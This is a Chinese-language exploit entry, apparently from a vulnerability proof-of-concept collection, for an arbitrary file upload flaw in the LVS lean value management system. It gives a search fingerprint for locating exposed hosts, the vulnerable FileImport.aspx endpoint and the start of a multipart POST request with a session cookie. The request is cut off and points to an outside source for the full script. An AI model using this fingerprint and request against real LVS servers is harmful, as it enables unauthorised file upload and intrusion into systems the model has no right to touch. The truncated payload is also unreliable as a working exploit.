# LVS精益价值管理系统CGMaterialBaseImport存在任意文件上传漏洞

- **系统**：LVS　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`body="/ajax/LVS.Core.Common.STSResult,LVS.Core.Common.ashx"`
- **请求**：`POST /Business/FileImport.aspx HTTP/1.1`

**请求体 / payload**
```
直接访问地址ip/Business/FileImport.aspx
Host:
Content-Length: 2743
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary3yAQlBeBktTvYBYI
Cookie: liger-home-tab=%5B%7B%22tabid%22%3A%22menu1288%22%2C%22text%22%3A%22%E6%8A%80%E6%9C%AF%E7%89%A9%E6%96%99%E9%85%8D%E7%BD%AE%22%2C%22url%22%3A%22DataConfig%2FJSMaterialBaseList.aspx%22%7D%5D; ASP.NET_SessionId=woqqjcmyyvsqnfyhlisgqaz3
------WebKitFormBoundary3yAQlBeBktTvYBYI
Content-Disposition: form-data; name="TimeStamps"
------WebKitFormBoundary3yAQlBeBktTvYBYI
Content-Disposition: form-data; name="PKID"
-1
------WebKitFormBoundary3yAQlBeBktTv…（脚本共 3145 字，完整版见原文）
```
- **预期**：200　|　—